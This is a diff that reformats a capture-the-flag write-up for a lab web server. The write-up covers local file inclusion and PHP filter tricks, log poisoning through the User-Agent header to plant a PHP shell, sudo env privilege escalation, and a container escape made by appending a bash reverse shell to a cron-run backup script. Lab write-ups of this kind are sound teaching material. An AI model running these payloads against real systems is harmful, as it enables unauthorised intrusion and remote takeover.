@@ -112,7 +112,7 @@ So we know the page requires us to include dog (or cat) in the view-parameter of
 
 We know the website is served using apache 2.4.38 (from opening /server-status and running nmap) so we could have a look at well known apache files e.g. the log files. Just to be safe, fell free to add as many ../ as you want :D
 
- ```html
+``` html
 ?view=./cat/../../../../../../../../var/log/apache2/access.log
 ```
 
@@ -125,7 +125,7 @@ Based on how we can manipulate the view parameter, this page may be vulnerable t
 With 'php://filter/convert.base64-encode/resource=' we can convert the given resource to base64
 With './cat/../index' we add they keyword cat and move back to the main web folder and choose index.php
 
- ```html
+``` html
 ?view=php://filter/convert.base64-encode/resource=./cat/../index
 ```
 
@@ -137,7 +137,7 @@ echo "PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT
 
 The index.php looks as follows:
 
- ```html
+``` html
 <!DOCTYPE HTML>
 <html>
 <head>
@@ -173,7 +173,7 @@ The interesting line here is ```$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.ph
 
 Now lets try looking at the apache2 access.log files again (this time with the "ext" parameter):
 
- ```html
+``` html
 ?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
 ```
 
@@ -181,7 +181,7 @@ Success! We can see the logs (our visits). The logs basically contain the URL re
 
 If you feel lucky, you could've guessed that there is a flag.php in the main folder of the website and try view this by misusing the view? parameter as follows:
 
- ```html
+``` html
 ?view=php://filter/convert.base64-encode/resource=./cat/../flag
 ```
 
@@ -197,9 +197,9 @@ However, this was a lucky guess... maybe there is another way to get there...
 
 We can try to inject PHP code to the access.log and trigger the code by visiting the page. Remember from above, there are two things we can manipulate at request time that are written to the logs, the URL request including parameters and the user-agent. Let's try running a request e.g.:
 
- ```html
+``` html
 ?view=./cat/../../<?php echo "HI!";?>
- ```html
+```
 
 Unfortunantly this fails as e.g. all spaces are URL encoded. However, there are clear spaces visible in the user-agent. Let's try to change the user-agent string:
 
@@ -247,7 +247,7 @@ print (requests.get('http://10.10.46.238/?view=cat', headers={'User-Agent': '<?p
 
 Use the previous technique to include the access log again:
 
- ```html
+``` html
 ?view=./cat/../../../../../../../../var/log/apache2/access&ext=.log
 ```
 
@@ -255,7 +255,7 @@ You should not see our injected agent string because the injected php code is in
 
 We can now start the shell.php located in the the main web folder:
 
- ```html
+``` html
 ?view=./cat/../shell
 ```
 
@@ -270,27 +270,18 @@ var/www/flag2_QMW7JvaY2LvK.txt
 
 Btw, it is possible to view flag2 within the browser and without reverse shell:
 
- ```html
+``` html
 ?view=./dog/../../../../../var/www/flag2_QMW7JvaY2LvK&ext=.txt
 ```
 
 ## Privilege escalation
 
-Now that we have a shell as user "www-data" let's see what this user is allowed to do:
+Now that we have a shell as user "www-data":
 
-``` sh
-sudo -l
-```
+- let's see what this user is allowed to do: ```sudo -l```
+- We can [exploit the env privilege](https://gtfobins.github.io/) with this command to gain root access: ```sudo /usr/bin/env sudo -i```
 
-We can [exploit the env privilege](https://gtfobins.github.io/) with this command to gain root access:
-
-``` sh
-sudo /usr/bin/env sudo -i
-```
-
-Running ```whoami``` we can see that we are root.
-
-Now, let's again look for a flag:
+Running ```whoami``` we can see that we are root. Now, let's again look for a flag:
 
 ``` sh
 find / -type f -iname "flag*"
@@ -301,35 +292,18 @@ find / -type f -iname "flag*"
 
 The last challenge is to find flag 4 which is nowhere to be found on the current system. We need to search for interesting things on the system...
 
-List IP addresses connected to your server on port 80
-
-``` sh
-netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head
-```
+List IP addresses connected to your server on port 80: ```netstat -tn 2>/dev/null | grep :80 | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head```
 
 In the root folder we can find a ".dockerenv" file.
 The hostname looks like a default docker container name.
-See if proc/self/cgroup contains "docker" or "lxc": ```grep 'docker\|lxc' /proc/1/cgroup```.
 
-or run this script:
+- Let's see if proc/self/cgroup contains "docker" or "lxc": ```grep 'docker\|lxc' /proc/1/cgroup```.
+- or run this script: ```echo IsContainer: ; if [[ -f /.dockerenv ]] || grep -Eq '(lxc|docker)' /proc/1/cgroup; then echo True; else echo False; fi```
 
-``` sh
-echo IsContainer: ; if [[ -f /.dockerenv ]] || grep -Eq '(lxc|docker)' /proc/1/cgroup; then echo True; else echo False; fi
-```
+So we know we are running in a container. Let us look around and find other interesting files e.g.:
 
-So we know we are running in a container.
-
-Let us look around and find other interesting files e.g. search for largest files:
-
-``` sh
-lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail
-```
-
-or search for newest files
-
-``` sh
-find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print
-```
+- search for largest files: ```lsof / | awk '{ if($7 > 1048576) print $7/1048576 "MB" " " $9 " " $1 }' | sort -n -u | tail```
+- or search for newest files ```find / -type d \( -name sys -o -name proc \) -prune -o -name "*"  -mtime -0.02 -print```
 
 We find that "backup.tar" was last updated and it is updated every minute!
 It seems as if the backup is created using the shell script in the same folder.
@@ -338,17 +312,8 @@ This looks promising: We are root in a container that hosts the dogcat website a
 
 Let's try to exploit the backup.sh with a bash reverse shell:
 
-First, start a new netcat session on your system:
-
-``` sh
-nc -lvnp 7777
-```
-
-Then append the bash reverse shell to the backup script:
-
-``` sh
-echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh
-```
+- Start a new netcat session on your system: ```nc -lvnp 7777```
+- Append the bash reverse shell to the backup script: ```echo "bash -i >& /dev/tcp/10.9.182.239/7777 0>&1" >> backup.sh```
 
 After waiting at most 59 seconds the backup job will trigger, run our modified script and we get another shell from the container host system.
 
